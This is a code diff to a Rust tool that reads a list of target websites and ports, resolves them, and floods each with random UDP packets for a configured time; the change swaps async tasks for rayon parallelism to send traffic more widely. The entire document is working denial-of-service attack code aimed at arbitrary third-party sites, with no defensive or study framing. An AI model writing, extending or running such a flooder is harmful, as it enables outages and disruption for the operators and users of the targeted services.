@@ -8,6 +8,7 @@ use std::{
     fs::File,
     io::{BufRead, BufReader},
     net::{SocketAddr, UdpSocket},
+    sync::{Arc, Mutex},
     thread::sleep,
     time::{Duration, Instant},
 };
@@ -16,6 +17,7 @@ use anyhow::*;
 use dns_lookup::lookup_host;
 use portpicker::pick_unused_port;
 use rand::{thread_rng, RngCore};
+use rayon::prelude::*;
 
 // ----- Attack Config START -----
 #[derive(Clone)]
@@ -39,7 +41,7 @@ impl Display for Config {
     }
 }
 
-async fn load_config() -> Result<Config> {
+fn load_config() -> Result<Config> {
     let config_file = File::open("config")?;
     let config_lines = BufReader::new(config_file).lines();
 
@@ -133,131 +135,121 @@ impl Debug for WebsiteConfig {
 fn load_websites_configs(config: &Config) -> Result<Vec<WebsiteConfig>> {
     info!("Loading websites configs...");
 
-    let mut configs = vec![];
+    let configs = Arc::new(Mutex::new(vec![]));
     let websites_file = File::open("websites")?;
     let websites = BufReader::new(websites_file).lines();
 
-    for website in websites.flatten() {
-        if website.is_empty() {
-            continue;
-        }
-
-        let mut split = website.split(' ');
-
-        if let Some(first) = split.next() {
-            let is_domain = match first {
-                "ip" => false,
-                "domain" => true,
-                _ => false,
-            };
-
-            if let Some(address) = split.next() {
-                let mut ports = vec![];
-
-                while let Some(port) = split.next() {
-                    ports.push(port.to_string());
-                }
-
-                if ports.len() == 0 {
-                    ports = config.default_ports.clone();
-                }
-
-                for port in ports.iter() {
-                    info!(
-                        "Found {} {} with port {}",
-                        if is_domain { "domain" } else { "ip" },
-                        address,
-                        port
-                    );
-                }
-
-                configs.push(WebsiteConfig {
-                    address: address.to_string(),
-                    ports,
-                    is_domain,
-                })
+    websites
+        .flatten()
+        .collect::<Vec<_>>()
+        .par_iter()
+        .for_each(|website| {
+            if website.is_empty() {
+                return;
             }
-        }
-    }
+
+            let mut split = website.split(' ');
+
+            if let Some(first) = split.next() {
+                let is_domain = match first {
+                    "ip" => false,
+                    "domain" => true,
+                    _ => false,
+                };
+
+                if let Some(address) = split.next() {
+                    let mut ports = vec![];
+
+                    while let Some(port) = split.next() {
+                        ports.push(port.to_string());
+                    }
+
+                    if ports.len() == 0 {
+                        ports = config.default_ports.clone();
+                    }
+
+                    for port in ports.iter() {
+                        info!(
+                            "Found {} {} with port {}",
+                            if is_domain { "domain" } else { "ip" },
+                            address,
+                            port
+                        );
+                    }
+
+                    (*configs).lock().unwrap().push(WebsiteConfig {
+                        address: address.to_string(),
+                        ports,
+                        is_domain,
+                    })
+                }
+            }
+        });
 
     info!("All websites loaded!\n{:?}", configs);
 
-    Ok(configs)
+    let res = Ok(configs.lock().unwrap().clone());
+    res
 }
 // ----- Website Configuration END -----
 
 // ----- Attack Websites START -----
-async fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Result<()> {
+fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Result<()> {
     info!("Starting attack on the websites...");
 
     let start = Instant::now();
 
-    let tasks = website_configs
-        .iter()
-        .map(|website_config| {
-            let website_config = website_config.clone();
-            let config = config.clone();
+    let socket_addresses = Arc::new(Mutex::new(vec![]));
 
-            tokio::spawn(async move {
-                attack_website(start, config, website_config).await;
-            })
-        })
-        .collect::<Vec<_>>();
-
-    futures::future::join_all(tasks).await;
-
-    Ok(())
-}
-
-async fn attack_website(start: Instant, config: Config, website_config: WebsiteConfig) {
-    info!("Starting parallel attack process...");
-
-    let packet_size = config.packet_size;
-
-    let mut socket_addresses = vec![];
-
-    if website_config.is_domain {
-        for port in website_config.ports.iter() {
-            socket_addresses.push(format!("{}:{}", website_config.address, port));
-        }
-    } else {
-        if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
-            for ip in ips.iter() {
-                for port in website_config.ports.iter() {
-                    socket_addresses.push(format!("{}:{}", ip, port));
-                }
-            }
+    website_configs.par_iter().for_each(|website_config| {
+        if !website_config.is_domain {
+            website_config.ports.par_iter().for_each(|port| {
+                (*socket_addresses).lock().unwrap().push(format!(
+                    "{}:{}",
+                    website_config.address,
+                    port.clone()
+                ));
+            });
         } else {
-            error!(
-                "Couldn't find ips for the domain {}",
-                website_config.address
-            );
-
-            return;
+            if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
+                ips.par_iter().for_each(|ip| {
+                    website_config.ports.par_iter().for_each(|port| {
+                        (*socket_addresses)
+                            .lock()
+                            .unwrap()
+                            .push(format!("{}:{}", ip, port));
+                    });
+                });
+            } else {
+                error!(
+                    "Couldn't find ips for the domain {}",
+                    website_config.address
+                );
+            }
         }
-    }
+    });
 
-    let tasks = socket_addresses
-        .iter()
-        .map(|socket_address| {
-            let socket_address = socket_address.clone();
+    (*socket_addresses)
+        .lock()
+        .unwrap()
+        .par_iter()
+        .for_each(|socket_address| {
+            let sender: SocketAddr = format!(
+                "0.0.0.0:{}",
+                pick_unused_port().expect("No free port found!")
+            )
+            .parse()
+            .expect("Couldn't get sender IP address");
 
-            tokio::spawn(async move {
-                let sender: SocketAddr = format!(
-                    "0.0.0.0:{}",
-                    pick_unused_port().expect("No free port found!")
-                )
-                .parse()
-                .expect("Couldn't get sender IP address");
+            info!("Creating socket for {} ...", sender);
 
-                info!("Creating socket for {} ...", sender);
+            let socket =
+                UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
 
-                let socket =
-                    UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
-
+            while start.elapsed().as_secs() < config.execution_time {
                 match socket.connect(socket_address.clone()) {
                     std::result::Result::Ok(_) => {
-                        let buffer = generate_buffer(packet_size);
+                        let buffer = generate_buffer(config.packet_size);
 
                         while start.elapsed().as_secs() < config.execution_time {
                             let res = socket.send(buffer.as_slice());
@@ -285,13 +277,14 @@ async fn attack_website(start: Instant, config: Config, website_config: WebsiteC
                             "Couldn't connect to {}.\nError message: {}",
                             socket_address, error
                         );
+
+                        break;
                     }
                 }
-            })
-        })
-        .collect::<Vec<_>>();
+            }
+        });
 
-    futures::future::join_all(tasks).await;
+    Ok(())
 }
 
 fn generate_buffer(size: usize) -> Vec<u8> {
@@ -305,17 +298,15 @@ fn generate_buffer(size: usize) -> Vec<u8> {
     buffer
 }
 // ----- Attack Websites END -----
-
-#[tokio::main(flavor = "multi_thread")]
-async fn main() -> Result<()> {
+fn main() -> Result<()> {
     std::env::set_var("RUST_LOG", "info");
 
     pretty_env_logger::init();
 
-    let config = load_config().await?;
+    let config = load_config()?;
     let website_configs = load_websites_configs(&config)?;
 
-    attack_websites(config, website_configs).await?;
+    attack_websites(config, website_configs)?;
 
     Ok(())
 }
